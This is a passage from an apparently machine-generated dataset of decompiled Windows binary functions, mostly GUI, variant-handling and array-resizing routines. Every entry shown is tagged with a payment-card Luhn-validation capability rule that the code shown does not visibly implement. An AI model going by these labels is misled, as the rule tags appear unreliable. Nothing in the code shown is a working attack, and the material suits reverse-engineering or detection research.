 pcVar1 = _sym.imp.OLEAUT32.dll_VariantCopy,  cVar2 == '\\0')) {\n        fcn.00433e2d();\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n        goto code_r0x00442c07;\n    }\n    uVar3 = uStack32 & 0xffff;\n    if (uVar3 < 0x82) {\n        if (uVar3 != 0x81) {\n            if (uVar3 < 9) {\n                if (uVar3 == 8) goto code_r0x00442baa;\n                if (uVar3 == 2) {\ncode_r0x0044291b:\n                    fcn.0043dff0();\n                    fcn.00433501();\n                    fcn.0043374f();\n                }\n                else if (uVar3 == 3) {\ncode_r0x004428f0:\n                    puVar4 = fcn.0043dff0();\n                    fcn.00433528(*puVar4, 3);\n                    fcn.0043374f();\n                }\n                else if (uVar3 == 4) {\n                    puVar5 = fcn.0043dff0();\n                    uStack88 = *puVar5;\n                    uStack96 = 4;\n                    uStack32 = uStack88;\n                    fcn.0043374f();\n                }\n                else if (uVar3 == 5) {\n                    fcn.0043dff0();\n                    fcn.0043374f();\n                }\n                else if (uVar3 == 6) {\n                    puVar4 = fcn.0043dff0();\n                    uStack72 = *puVar4;\n                    uStack68 = puVar4[1];\n                    uStack80 = 6;\n                    fcn.0043374f();\n                }\n                else {\n                    if (uVar3 != 7) goto code_r0x00442bf5;\n                    fcn.0043dff0();\n                    fcn.0043374f();\n                }\n            }\n            else if (uVar3 == 0xb) {\n                fcn.0043dff0();\n                fcn.00433501();\n                fcn.0043374f();\n            }\n            else {\n                if (uVar3 != 0xc) {\n                    if (0xf < uVar3) {\n                        if (uVar3 < 0x12) {\n                            fcn.0043dff0();\n                            fcn.0043374f();\n                            goto code_r0x0044299e;\n                        }\n                        if (uVar3 == 0x12) goto code_r0x0044291b;\n                        if (uVar3 == 0x13) goto code_r0x004428f0;\n                    }\n                    goto code_r0x00442bf5;\n                }\n                fcn.0043dff0();\n                fcn.00433e0d();\n                fcn.0043374f();\n            }\n            goto code_r0x0044299e;\n        }\n        fcn.0043dff0();\n        puVar4 = fcn.00402f40();\n        fcn.0043590b(*puVar4, 8);\n        fcn.0043374f();\n        (*pcVar1)();\ncode_r0x00442bea:\n        fcn.004010d0();\n    }\n    else {\n        if (uVar3 == 0x82) {\ncode_r0x00442baa:\n            arg_8h = fcn.0043dff0();\n            puVar4 = fcn.00418320(arg_8h);\n            fcn.0043590b(*puVar4, 8);\n            fcn.0043374f();\n            (*pcVar1)();\n            goto code_r0x00442bea;\n        }\n        if (uVar3 == 0x83) {\n            cVar2 = fcn.0043fd7d();\n            if (cVar2 != '\\0') {\n                while (uStack28._1_1_ != 0) {\n                    uStack28._1_1_ = uStack28 >> 8;\n                    uStack28._1_1_ = uStack28._1_1_ - 1;\n                    uStack28 = uStack28 & 0xff | uStack28._1_1_ << 8;\n                }\n                fcn.0043374f();\n                goto code_r0x0044299e;\n            }\n        }\n        else if (uVar3 == 0x85) {\n            cVar2 = fcn.0043fda7();\n            if (cVar2 != '\\0') {\n                uStack24 = 0;\n                uStack22 = 0;\n                uStack20 = 0;\n                uStack18 = 0;\n                uStack17 = 0;\n                uStack16 = 0;\n                puStackY168 = 0x442b35;\n                fcn.00433cec(iStack60, uStack58, uStack56, 0, 0, 0);\n                uStack112 = CONCAT22(uStack112._2_2_, 7);\n                uStack104 = CONCAT17(uStack17, CONCAT16(uStack18, CONCAT24(uStack20, CONCAT22(uStack22, uStack24))));\n                uStackY172 = 0x442b51;\n                puStackY168 = &stack0xffffff90;\n                fcn.0043374f();\n                goto code_r0x0044299e;\n            }\n        }\n        else if (uVar3 == 0x86) {\n            cVar2 = fcn.0043fddc();\n            if (cVar2 != '\\0') {\n                uStack24 = 0;\n                uStack22 = 0;\n                uStack20 = 0;\n                uStack18 = 0;\n                uStack17 = 0;\n                uStack16 = 0;\n                fcn.0043de25();\n                fcn.0043374f();\n                goto code_r0x0044299e;\n            }\n        }\n        else if ((uVar3 == 0x87) && (cVar2 = fcn.0043fe11(),  cVar2 != '\\0')) {\n            puStackY168 = 0x442a81;\n            fcn.00440093(uStack28, CONCAT11(uStack25, uStack26), uStack24, uStack22, uStack20, \n                         CONCAT11(uStack17, uStack18));\n            puStackY168 = &stack0xffffff54;\n            uStackY172 = 0x442a9c;\n            fcn.0043374f();\ncode_r0x0044299e:\n            (*pcVar1)();\n        }\n    }\ncode_r0x00442bf5:\n    fcn.00433e2d();\n    (*pcVar1)();\ncode_r0x00442c07:\n    *in_FS_OFFSET = param_2;\n    fcn.004566a8(param_2);\n    return;\n}\n",
        "token_count": 1960
    },
    "004433c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004433c5(int32_t param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_retaddr;\n    \n    if (*(param_1 + 0x50) != 0) {\n        fcn.0043c9ee(param_2);\n        return;\n    }\n    uVar1 = fcn.00442fc8(param_1, 0);\n    if (((-(unaff_retaddr != 0) & 0x10U) + 0x10 & uVar1) != 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0xf4, unaff_retaddr != 0, 1);\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "004440e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: lpClassName\n\nvoid fcn.004440e6(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint lpClassName;\n    uint var_4h;\n    \n    fcn.00458e45(0xc);\n    fcn.0042b7b9();\n    fcn.004320fb(1);\n    *(unaff_EBP + -0x14) = 0;\n    fcn.00439072(unaff_EBP + -0x10, 0x48a40c, unaff_EBP + -0x14);\n    *(unaff_EBP + -4) = 0;\n    while (*(*(unaff_EBP + -0x10) + -0xc) != 0) {\n        iVar1 = fcn.0042b7b9();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(*(unaff_EBP + -0x10), *(iVar1 + 8));\n        uVar2 = fcn.00439072(unaff_EBP + -0x18, 0x48a40c, unaff_EBP + -0x14);\n        *(unaff_EBP + -4) = 1;\n        fcn.00402200(uVar2);\n        *(unaff_EBP + -4) = 0;\n        fcn.004010d0();\n    }\n    fcn.004016d0();\n    fcn.00432168(1);\n    fcn.004010d0();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 421
    },
    "0044433b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0044433b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    uVar1 = fcn.00423280();\n    fcn.00401680(uVar1);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.00402ed0(*(unaff_EBP + 0xc));\n    if (iVar2 != 0) {\n        fcn.004441f9(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    fcn.004010d0();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 257
    },
    "0044463b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044463b(void)\n\n{\n    int32_t unaff_ESI;\n    \n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(unaff_ESI + 0x10);\n    return;\n}\n",
        "token_count": 49
    },
    "0044468c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044468c(void)\n\n{\n    int32_t unaff_ESI;\n    \n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(unaff_ESI + 0x10);\n    return;\n}\n",
        "token_count": 49
    },
    "00444be1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444be1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    \n    iVar1 = arg_8h;\n    iVar4 = 0;\n    if (-1 < arg_8h) goto code_r0x00444bf7;\n    do {\n        fcn.0041901a();\ncode_r0x00444bf7:\n        if (iVar4 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == iVar4) {\n            fcn.004170df(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar4;\n            *(in_ECX + 8) = iVar4;\n            goto code_r0x00444cfb;\n        }\n        if (*(in_ECX + 4) == iVar4) {\n            uVar2 = fcn.004170b4(iVar1 << 2);\n            *(in_ECX + 4) = uVar2;\n            fcn.00459330(uVar2, 0, iVar1 << 2);\n            *(in_ECX + 0xc) = iVar1;\ncode_r0x00444c63:\n            *(in_ECX + 8) = iVar1;\n            return;\n        }\n        iVar4 = *(in_ECX + 0xc);\n        if (iVar1 <= iVar4) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00459330(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x00444c63;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\ncode_r0x00444c95:\n                iVar3 = 4;\n            }\n            else if (iVar3 < 0x401) {\n                if (iVar3 < 4) goto code_r0x00444c95;\n            }\n            else {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + iVar4;\n        if (iVar3 + iVar4 <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < iVar4);\n    iVar4 = fcn.004170b4(arg_8h << 2);\n    fcn.00417b17(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00459330(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.004170df(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00444cfb:\n    *(in_ECX + 4) = iVar4;\n    return;\n}\n",
        "token_count": 773
    },
    "00444df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444df0(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.00444be1(iVar1 + arg_10h, 0xffffffff);\n            fcn.0040e880(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, ((*(in_ECX + 8) - arg_8h) - arg_10h) * 4, \n                         *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.00459330(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.00444be1(arg_8h + arg_10h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.0041901a();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 389
    },
    "00444e94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00444e94(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = param_2 + param_3;\n    if ((((-1 < param_2) && (-1 < param_3)) && (iVar1 <= *(param_1 + 8))) && ((param_2 <= iVar1 && (param_3 <= iVar1))))\n    {\n        iVar3 = *(param_1 + 8) - iVar1;\n        if (iVar3 != 0) {\n            iVar3 = iVar3 * 4;\n            fcn.0040e880(*(param_1 + 4) + param_2 * 4, iVar3, *(param_1 + 4) + iVar1 * 4, iVar3);\n        }\n        *(param_1 + 8) = *(param_1 + 8) - param_3;\n        return;\n    }\n    fcn.0041901a();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 258
    },
    "004451f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004451f8(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (0x10b < param_1) {\n        if (param_1 == 0x3e3) {\n            return 10;\n        }\n        if (param_1 == 0x3e4) {\n            return 10;\n        }\n        if (param_1 == 0x3e5) {\n            return 10;\n        }\n        if (param_1 == 999) {\n            return 5;\n        }\n        return 1;\n    }\n    if (param_1 == 0x10b) {\n        return 3;\n    }\n    if (param_1 < 0x3f) {\n        if (param_1 == 0x3e) {\n            return 8;\n        }\n        if (param_1 < 0x1a) {\n    // switch table (25 cases) at 0x445404\n            switch(param_1) {\n            case 0:\n                return 0;\n            case 1:\n            case 7:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0xe:\n                goto code_r0x0044532c;\n            case 2:\n            case 6:\n            case 0x12:\n                goto code_r0x0044532c;\n            case 3:\n            case 0xf:\n            case 0x11:\n                goto code_r0x0044532c;\n            case 4:\n                return 4;\n            case 5:\n            case 0xc:\n            case 0x13:\ncode_r0x0044532c:\n                return 5;\n            case 0xb:\ncode_r0x0044532c:\n                return 6;\n            case 0x10:\n                return 7;\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\ncode_r0x0044532c:\n                return 10;\n            default:\n                goto code_r0x0044532c;\n            }\n        }\n        if (0x27 < param_1) {\n    // switch table (9 cases) at 0x445468\n            switch(param_1) {\n            case 0x34:\n            case 0x35:\n            case 0x37:\n                goto code_r0x0044532c;\n            case 0x36:\n            case 0x3a:\n                goto code_r0x0044532c;\n            default:\n                return 1;\n            case 0x39:\n            case 0x3b:\n                goto code_r0x0044532c;\n            case 0x3c:\n                goto code_r0x0044532c;\n            }\n        }\n        if (param_1 == 0x27) {\n            return 0xd;\n        }\n        if (0x20 < param_1) {\n            if (param_1 == 0x21) {\n                return 0xc;\n            }\n            if (param_1 == 0x22) {\n                return 3;\n            }\n            if (param_1 == 0x24) {\n                return 4;\n            }\n            if (param_1 == 0x26) {\n                return 0xe;\n            }\n            return 1;\n        }\n        if (param_1 == 0x20) {\n            return 0xb;\n        }\n        if (param_1 == 0x1a) {\n            return 6;\n        }\n        if (param_1 == 0x1b) {\n            return 9;\n        }\n        iVar1 = param_1 - 0x1d;\n        if (iVar1 == 0) {\n            return 5;\n        }\ncode_r0x00445273:\n        if (iVar1 == 1) {\ncode_r0x0044532c:\n            return 9;\n        }\n    }\n    else {\n        if (param_1 < 0x6c) {\n            if (param_1 == 0x6b) {\ncode_r0x0044532c:\n                return 2;\n            }\n            if (0x47 < param_1) {\n                if (param_1 == 0x50) {\n                    return 5;\n                }\n                if (param_1 == 0x52) {\n                    return 5;\n                }\n                if (param_1 == 0x55) {\n                    return 3;\n                }\n                if (param_1 != 0x56) {\n                    if (param_1 == 0x58) {\n                        return 10;\n                    }\n                    return 1;\n                }\n                return 5;\n            }\n            if (param_1 == 0x47) {\n                return 5;\n            }\n            if (param_1 == 0x40) {\n                return 5;\n            }\n            if (param_1 == 0x41) {\n                return 5;\n            }\n            if (param_1 == 0x42) {\n                return 6;\n            }\n            if (param_1 == 0x43) {\n                return 3;\n            }\n            iVar1 = param_1 - 0x44;\n            if (iVar1 == 0) {\n                return 4;\n            }\n        }\n        else {\n            if (param_1 < 0x91) {\n                if (param_1 == 0x90) {\n                    return 3;\n                }\n                if (param_1 < 0x76) {\n                    if (param_1 == 0x75) {\n                        return 10;\n                    }\n                    if (param_1 == 0x6c) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0x6f) {\n                        return 3;\n                    }\n                    if (param_1 == 0x70) {\n                        return 0xd;\n                    }\n                    if (param_1 == 0x71) {\n                        return 4;\n                    }\n                    if (param_1 != 0x72) {\n                        return 1;\n                    }\n                    return 6;\n                }\n                if (param_1 == 0x7b) {\n                    return 3;\n                }\n                if (param_1 == 0x7c) {\n                    return 3;\n                }\n                if (param_1 == 0x7d) {\n                    return 3;\n                }\n                iVar1 = param_1 - 0x83;\n                if (iVar1 == 0) {\n                    return 9;\n                }\n                goto code_r0x00445273;\n            }\n            if (param_1 < 0xb7) {\n                if (param_1 == 0xb6) {\n                    return 6;\n                }\n                if (param_1 == 0x91) {\n                    return 7;\n                }\n                if (param_1 == 0x9a) {\n                    return 3;\n                }\n                if (param_1 != 0xa1) {\n                    if (param_1 == 0xa7) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0xaa) {\n                        return 5;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (param_1 == 0xb7) {\n                return 5;\n            }\n            if (param_1 == 0xbf) {\n                return 6;\n            }\n            if (param_1 == 0xc1) {\n                return 6;\n            }\n            iVar1 = param_1 - 0xce;\n            if (iVar1 == 0) {\n                return 3;\n            }\n        }\n        if (iVar1 == 2) {\ncode_r0x0044532c:\n            return 3;\n        }\n    }\ncode_r0x0044532c:\n    return 1;\n}\n",
        "token_count": 1728
    },
    "00445a16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00445a16(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004593aa(param_1, param_2, param_3, param_4);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 82
    },
    "00445a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445a60(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t unaff_EDI;\n    \n    iVar1 = arg_8h;\n    iVar4 = unaff_EDI;\n    if (-1 < arg_8h) goto code_r0x00445a73;\n    do {\n        fcn.0041901a();\n        iVar4 = unaff_EDI;\ncode_r0x00445a73:\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == 0) {\n            if (*(in_ECX + 4) != 0) {\n                fcn.004170df(*(in_ECX + 4));\n                *(in_ECX + 4) = 0;\n            }\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            return;\n        }\n        if (*(in_ECX + 4) == 0) {\n            iVar3 = *(in_ECX + 0x10);\n            if (*(in_ECX + 0x10) < iVar1) {\n                iVar3 = iVar1;\n            }\n            uVar2 = fcn.004170b4(iVar3 << 2, iVar4);\n            *(in_ECX + 4) = uVar2;\n            fcn.00459330(uVar2, 0, iVar3 << 2);\n            *(in_ECX + 0xc) = iVar3;\n            goto code_r0x00445b8f;\n        }\n        unaff_EDI = *(in_ECX + 0xc);\n        if (iVar1 <= unaff_EDI) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00459330(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x00445b8f;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\n                iVar3 = 4;\n            }\n            else if (0x400 < iVar3) {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + unaff_EDI;\n        if (iVar3 + unaff_EDI <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < unaff_EDI);\n    iVar4 = fcn.004170b4(arg_8h << 2, iVar4);\n    fcn.00417b17(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00459330(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.004170df(*(in_ECX + 4));\n    *(in_ECX + 4) = iVar4;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00445b8f:\n    *(in_ECX + 8) = iVar1;\n    return;\n}\n",
        "token_count": 825
    },
    "00445dc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00445dc9(uint *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042b206();\n    param_1[1] = iVar1;\n    param_1[2] = *(iVar1 + 0xf0);\n    *param_1 = *(iVar1 + 0xec);\n    *(iVar1 + 0xec) = param_2;\n    *(param_1[1] + 0xf0) = param_1;\n    return param_1;\n}\n",
        "token_count": 127
    },
    "00447953": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447953(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    \n    iVar2 = arg_8h;\n    if ((arg_8h == 0) || ((*(in_ECX + 0xf) & 4) == 0)) {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[8]);\n        iVar4 = fcn.0041e67e(uVar3);\n        if (iVar4 != 0) {\n            arg_8h = 0;\n            (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(*(iVar4 + 0x20), &arg_8h);\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n            if (iVar4 == arg_8h) {\n                return;\n            }\n        }\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        if (iVar2 == 0) {\n            if (in_ECX[0x2e] == 0) {\n                in_ECX[0xf] = in_ECX[0xf] | 0x80;\n                (**(*in_ECX + 0xf8))();\n            }\n        }\n        else {\n            if (in_ECX[0xf] < '\\0') {\n                in_ECX[0xf] = in_ECX[0xf] & 0xffffff7f;\n                (**(*in_ECX + 0xfc))();\n                arg_8h = in_ECX[8];\n                iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                if (iVar4 == arg_8h) {\n                    (*pcVar1)(arg_8h, 6, 1, 0);\n                }\n            }\n            if ((*(in_ECX + 0xf) & 0x20) != 0) {\n                (*pcVar1)(in_ECX[8], 0x86, 1, 0);\n            }\n        }\n        fcn.004460a2((-(iVar2 != 0) & 0xfffffff0) + 0x20);\n    }\n    else {\n        fcn.00422739(0);\n        (*_sym.imp.USER32.dll_SetFocus)(0);\n    }\n    return;\n}\n",
        "token_count": 527
    },
    "00447b47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447b47(uint param_1)\n\n{\n    fcn.0042b7b9();\n    fcn.00424ceb();\n    fcn.004310d8(param_1);\n    return;\n}\n",
        "token_count": 52
    },
    "00447b64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447b64(uint param_1)\n\n{\n    fcn.0042b7b9();\n    fcn.00424ceb();\n    fcn.004310f1(param_1);\n    return;\n}\n",
        "token_count": 52
    },
    "00448865": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00448865(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.00458eae(0x28);\n    iVar1 = *(unaff_EBP + 8);\n    uVar2 = fcn.00423280();\n    fcn.00401680(uVar2);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.004225b8();\n    if ((uVar3 & 0x4000) == 0) {\n        fcn.00402460(extraout_ECX + 0xc4);\n        if (iVar1 != 0) {\n            fcn.004182f6(0x4902a0);\n            fcn.004182f6(iVar1);\n            if (0 < *(extraout_ECX + 0x58)) {\n                fcn.004595a7(unaff_EBP + -0x30, 0x20, 0x4902a4, *(extraout_ECX + 0x58));\n                fcn.004182f6(unaff_EBP + -0x30);\n            }\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            fcn.004182f6(iVar1);\n            if (0 < *(extraout_ECX + 0x58)) {\n                fcn.004595a7(unaff_EBP + -0x30, 0x20, 0x4902a4, *(extraout_ECX + 0x58));\n                fcn.004182f6(unaff_EBP + -0x30);\n            }\n            fcn.004182f6(0x4902a0);\n        }\n        fcn.00402460(extraout_ECX + 0xc4);\n    }\n    fcn.00431d30(*(extraout_ECX + 0x20), *(unaff_EBP + -0x34));\n    fcn.004010d0();\n    fcn.00458f31();\n    return;\n}\n",
        "token_count": 519
    },
    "00449148": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00449148(uint8_t *param_1, uint16_t param_2)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (0x15 < param_2) {\n        fcn.0041901a();\n    }\n    iVar3 = *(param_2 * 4 + 0x490380) + 4;\n    do {\n        uVar1 = *param_1;\n        if (uVar1 == 0) {\n            return iVar3;\n        }\n        if (uVar1 != 0xff) {\n            iVar4 = 0x490328;\n            if ((uVar1 & 0x40) == 0) {\n                iVar4 = 0x4902d0;\n            }\n            if (0x15 < (uVar1 & 0xbf)) {\n                fcn.0041901a();\n                pcVar2 = swi(3);\n                iVar3 = (*pcVar2)();\n                return iVar3;\n            }\n            iVar3 = iVar3 + *(iVar4 + (uVar1 & 0xbf) * 4);\n        }\n        param_1 = param_1 + 1;\n    } while( true );\n}\n",
        "token_count": 282
    },
    "00449254": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00449254(int32_t param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if ((-1 < param_2) && (param_2 < *(param_1 + 8))) {\n        return param_2 * 0xc + *(param_1 + 4);\n    }\n    fcn.0041901a();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 122
    },
    "004495e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004495e4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    bool bVar7;\n    \n    iVar6 = arg_8h;\n    bVar7 = -1 < arg_8h;\n    arg_8h = 0;\n    if (bVar7) goto code_r0x004495fa;\n    do {\n        fcn.0041901a();\ncode_r0x004495fa:\n        if (arg_8h <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar6 == arg_8h) {\n            if (*(in_ECX + 4) != arg_8h) {\n                iVar6 = 0;\n                if (*(in_ECX + 8) != arg_8h && arg_8h <= *(in_ECX + 8)) {\n                    do {\n                        fcn.004492c6();\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < *(in_ECX + 8));\n                }\n                fcn.004170df(*(in_ECX + 4));\n                *(in_ECX + 4) = arg_8h;\n            }\n            *(in_ECX + 0xc) = arg_8h;\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        if (*(in_ECX + 4) == arg_8h) {\n            arg_8h = iVar6;\n            if (iVar6 <= *(in_ECX + 0x10)) {\n                arg_8h = *(in_ECX + 0x10);\n            }\n            uVar1 = fcn.004170b4(arg_8h * 0xc);\n            *(in_ECX + 4) = uVar1;\n            fcn.00459330(uVar1, 0, arg_8h * 0xc);\n            if (0 < iVar6) {\n                iVar4 = 0;\n                iVar5 = iVar6;\n                do {\n                    puVar2 = *(in_ECX + 4) + iVar4;\n                    if (puVar2 != NULL) {\n                        *puVar2 = 0;\n                        puVar2[1] = 0;\n                    }\n                    iVar4 = iVar4 + 0xc;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            goto code_r0x004497d8;\n        }\n        if (iVar6 <= *(in_ECX + 0xc)) {\n            iVar5 = *(in_ECX + 8);\n            if (iVar5 < iVar6) {\n                fcn.00459330(iVar5 * 0xc + *(in_ECX + 4), arg_8h, (iVar6 - iVar5) * 0xc);\n                iVar5 = 0;\n                if 